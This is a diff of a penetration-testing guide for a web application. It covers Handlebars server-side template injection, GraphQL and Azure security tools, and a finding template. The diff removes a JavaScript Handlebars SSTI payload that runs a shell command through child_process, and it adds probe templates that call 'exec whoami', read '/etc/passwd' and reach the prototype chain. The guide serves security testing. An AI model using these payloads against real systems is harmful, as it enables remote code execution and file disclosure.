@@ -273,38 +273,24 @@ var filter = Builders<User>.Filter.Eq(u => u.Username, userInput);
 
 ### Server-Side Template Injection (SSTI) — Handlebars
 
-Handlebars templates (`body.hbs.html`) are processed server-side with `HandlebarsDotNet`:
+Templates (`body.hbs.html`) are processed server-side with `HandlebarsDotNet` (C#). Unlike JavaScript Handlebars, HandlebarsDotNet does **not** expose `require()` or prototype chains — standard JS SSTI payloads will not work.
 
-```handlebars
-{{! Test for SSTI in user-controlled template data }}
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').execSync('id');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
-
-**HandlebarsDotNet-specific mitigations to verify**:
-- `ThrowOnUnresolvedBindingExpression` — strict mode enabled?
-- Custom helpers — check for dangerous registered helpers
+**HandlebarsDotNet attack surface**:
+- Custom helpers — check for registered helpers that execute code, read files, or access system resources
+- `ThrowOnUnresolvedBindingExpression` — if disabled, unresolved bindings silently return empty (information leakage)
 - Template source — are templates loaded from trusted blob storage only, or can users inject template content?
-- Data context — verify user-supplied data cannot override template structure
+- Data context — verify user-supplied data cannot override template structure or inject helper calls
 
 **Key distinction**: If only _data_ (placeholder values) comes from users but template files come from blob storage, SSTI risk is low. If users can influence template content, risk is critical.
+
+**Test vectors**:
+```handlebars
+{{! Probe for custom helpers }}
+{{exec "whoami"}}
+{{file "/etc/passwd"}}
+{{lookup this "constructor"}}
+{{#each (lookup this "__proto__")}}{{{this}}}{{/each}}
+```
 
 ### SSRF via URL Validation
 
@@ -439,32 +425,16 @@ mutation {
 
 | Tool | Purpose |
 |---|---|
-| [InQL](https://github.com/doyensec/inern) | Burp extension for GraphQL testing |
+| [InQL](https://github.com/doyensec/inql) | Burp extension for GraphQL testing |
 | [graphql-cop](https://github.com/dolevf/graphql-cop) | Automated GraphQL security auditor |
 | [BatchQL](https://github.com/assetnote/batchql) | Batch query attack tool |
 | [graphw00f](https://github.com/dolevf/graphw00f) | GraphQL engine fingerprinting |
 | [CrackQL](https://github.com/nicholasaleks/CrackQL) | GraphQL brute-force / fuzzing |
 | [Clairvoyance](https://github.com/nikitastupin/clairvoyance) | Schema extraction without introspection |
 
-### General Web Security
+### General & Cloud
 
-| Tool | Purpose |
-|---|---|
-| Burp Suite | Intercepting proxy, scanner, repeater |
-| OWASP ZAP | Open-source web app scanner |
-| Nuclei | Template-based vulnerability scanner |
-| ffuf | Web fuzzer for path/parameter discovery |
-| sqlmap | SQL injection (for rare SQL Server paths) |
-| jwt_tool | JWT token analysis and attacks |
-
-### Azure & Cloud
-
-| Tool | Purpose |
-|---|---|
-| az cli | Azure resource enumeration |
-| ScoutSuite | Multi-cloud security auditing |
-| Prowler | Azure/AWS security best practices checks |
-| MicroBurst | Azure-specific attack toolkit |
+Burp Suite, OWASP ZAP (web scanning), Nuclei (template-based scanning), ffuf (fuzzing), sqlmap (SQL injection), jwt_tool (JWT attacks), az cli (Azure enumeration), ScoutSuite / Prowler (cloud security auditing), MicroBurst (Azure attack toolkit).
 
 ## Reporting
 
@@ -480,33 +450,7 @@ mutation {
 
 ### Finding Template
 
-```markdown
-## [SEVERITY] Finding Title
-
-**CVSS Score**: X.X (Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
-
-### Description
-Concise description of the vulnerability.
-
-### Affected Component
-- Endpoint / Service / Configuration
-
-### Steps to Reproduce
-1. Step-by-step reproduction
-2. Include exact requests/responses
-
-### Evidence
-- Screenshots, HTTP request/response pairs, tool output
-
-### Impact
-Business impact assessment.
-
-### Remediation
-Specific fix recommendations with code examples where applicable.
-
-### References
-- CVE IDs, OWASP references, CWE numbers
-```
+Structure each finding as: **Title** → CVSS Score + Vector → Description → Affected Component → Steps to Reproduce (with exact requests/responses) → Evidence → Impact → Remediation (with code examples) → References (CVE, CWE, OWASP).
 
 ### OWASP Top 10 Checklist (Web Application Focus)
 
